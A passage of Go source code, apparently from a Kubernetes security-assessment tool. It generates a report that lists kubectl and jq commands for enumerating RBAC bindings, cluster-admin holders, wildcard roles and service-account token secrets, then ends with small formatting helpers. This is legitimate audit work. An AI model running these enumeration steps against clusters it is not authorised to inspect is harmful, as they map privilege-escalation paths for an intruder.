kubectl get rolebindings -A -o json | jq -r '.items[] | select(.subjects[]? | select(.name=="%s")) | "\(.metadata.namespace)/\(.metadata.name)"'

### 6. Get details of specific ClusterRole
kubectl get clusterrole %s -o yaml

### 7. List all ServiceAccounts
kubectl get serviceaccounts -A

### 8. Find all identities with cluster-admin
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name=="cluster-admin") | .subjects[]? | "\(.kind)/\(.name)"'

### 9. Find overly permissive RBAC rules
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | select(.verbs[]? == "*" or .resources[]? == "*")) | .metadata.name'

### 10. Audit ServiceAccount tokens
kubectl get secrets -A -o json | jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | "\(.metadata.namespace)/\(.metadata.name)"'

## Advanced Enumeration

### Using kubectl-who-can (requires plugin)
# Install: kubectl krew install who-can
kubectl who-can create pods
kubectl who-can get secrets --all-namespaces

### Extracting full RBAC policy
kubectl get clusterroles,roles,clusterrolebindings,rolebindings -A -o yaml > rbac-full-dump.yaml
`,
		identity,
		m.Result.Identity.FullServiceAccountName(),
		formatGroupsList(m.Result.Identity.Groups),
		identity,
		identity,
		clusterRole,
	)
}

// Helper functions

func orUnknown(s string) string {
	if s == "" {
		return "unknown"
	}
	return s
}

func formatVersion(v *models.VersionInfo) string {
	if v == nil {
		return "unknown"
	}
	return v.GitVersion
}

func formatGroupsList(groups []string) string {
	if len(groups) == 0 {
		return "- None"
	}
	var result string
	for _, group := range groups {
		result += fmt.Sprintf("- %s\n", group)
	}
	return result
}

func boolToYesNo(b bool) string {
	if b {
		return "Yes"
	}
	return "No"
}

// formatSubject formats the RBAC subject for display
func formatSubject(kind, name, namespace string) string {
	if kind == "" || name == "" {
		return ""
	}
	switch kind {
	case "ServiceAccount":
		if namespace != "" {
			return fmt.Sprintf("SA:%s/%s", namespace, name)
		}
		return fmt.Sprintf("SA:%s", name)
	case "Group":
		return fmt.Sprintf("Group:%s", name)
	case "User":
		return fmt.Sprintf("User:%s", name)
	default:
		return fmt.Sprintf("%s:%s", kind, name)
	}
}
